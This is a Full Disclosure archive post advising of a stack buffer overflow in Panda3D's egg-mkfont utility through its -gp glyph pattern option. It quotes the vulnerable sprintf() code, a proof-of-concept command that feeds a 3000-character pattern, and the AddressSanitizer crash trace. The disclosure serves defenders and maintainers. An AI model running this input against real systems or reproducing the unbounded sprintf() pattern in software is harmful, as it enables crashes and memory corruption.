---
title: Panda3d v1.10.16 egg-mkfont Stack Buffer Overflow
url: https://seclists.org/fulldisclosure/2026/Jan/10
source: Full Disclosure
date: 2026-01-06
fetch_date: 2026-01-07T03:30:40.371099
---

# Panda3d v1.10.16 egg-mkfont Stack Buffer Overflow

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

![](/shared/images/nst-icons.svg#search)

# Panda3d v1.10.16 egg-mkfont Stack Buffer Overflow

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Thu, 1 Jan 2026 03:31:52 -0500

---

```
A stack-based buffer overflow vulnerability exists in the Panda3D
egg-mkfont utility due to the use of an unbounded sprintf() call with
attacker-controlled input. By supplying an excessively long glyph pattern
string via the -gp command-line option, an attacker can trigger a stack
buffer overflow, resulting in a deterministic crash of the egg-mkfont
process.

*Technical Details:*
The vulnerability occurs when egg-mkfont constructs output glyph filenames
using a fixed-size stack buffer and the unsafe sprintf() function. The
glyph pattern string (-gp option) is fully attacker-controlled and is not
length-checked prior to formatting.

*Vulnerable Code:*
char buffer[1024];
sprintf(buffer, _output_glyph_pattern.c_str(), character);
If the user supplies a glyph pattern string longer than the size of buffer,
sprintf() writes past the end of the stack buffer, corrupting adjacent
stack memory.

*Root Cause:*

   - Use of sprintf() instead of a bounded formatting function
   - Fixed-size stack buffer
   - Attacker-controlled input passed directly to formatting routine
   - No input length validation

*Impact:*

   - *Denial of Service (DoS): *The egg-mkfont utility crashes reliably
   when provided with crafted input.
   - *Memory Corruption: *Stack memory beyond the intended buffer is
   overwritten
   - Possible Arbitrary code execution

*Proof of Concept:*
./egg-mkfont \
  -gp "$(python3 - << 'EOF'
print("A" * 3000 + "%d")
EOF
)" \
  /usr/share/fonts/truetype/dejavu/DejaVuSans.ttf \
  out.egg

*Output:*
================================================================
==3237531==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbff9e552880 at pc 0xffffb527bf2c bp 0xffffeae1dd60 sp 0xffffeae1d520
WRITE of size 3003 at 0xfbff9e552880 thread T0
    #0 0xffffb527bf28 in vsprintf
../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1726
    #1 0xffffb527d50c in __sprintf_chk
../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1774
    #2 0xaaaadab5a62c in sprintf
/usr/include/aarch64-linux-gnu/bits/stdio2.h:30
    #3 0xaaaadab5a62c in EggMakeFont::make_tref(PNMTextGlyph*, int)
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:641
    #4 0xaaaadab64670 in EggMakeFont::get_tref(PNMTextGlyph*, int)
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:629
    #5 0xaaaadab6584c in EggMakeFont::make_geom(PNMTextGlyph*, int)
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:602
    #6 0xaaaadab69848 in EggMakeFont::run()
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:476
    #7 0xaaaadab412c8 in main
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:743
    #8 0xffffa04f2598 in __libc_start_call_main
../sysdeps/nptl/libc_start_call_main.h:58
    #9 0xffffa04f2678 in __libc_start_main_impl ../csu/libc-start.c:360
    #10 0xaaaadab422ec in _start
(/root/panda3d/build-asan/bin/egg-mkfont+0x6822ec) (BuildId:
71c2d66676c55693efa5c9aa3c9dbe806f4cdc00)

Address 0xfbff9e552880 is located in stack of thread T0 at offset 2176 in
frame
    #0 0xaaaadab5a4f8 in EggMakeFont::make_tref(PNMTextGlyph*, int)
/root/panda3d/pandatool/src/egg-mkfont/eggMakeFont.cxx:639
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

### Current thread:

* **Panda3d v1.10.16 egg-mkfont Stack Buffer Overflow** *Ron E (Jan 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")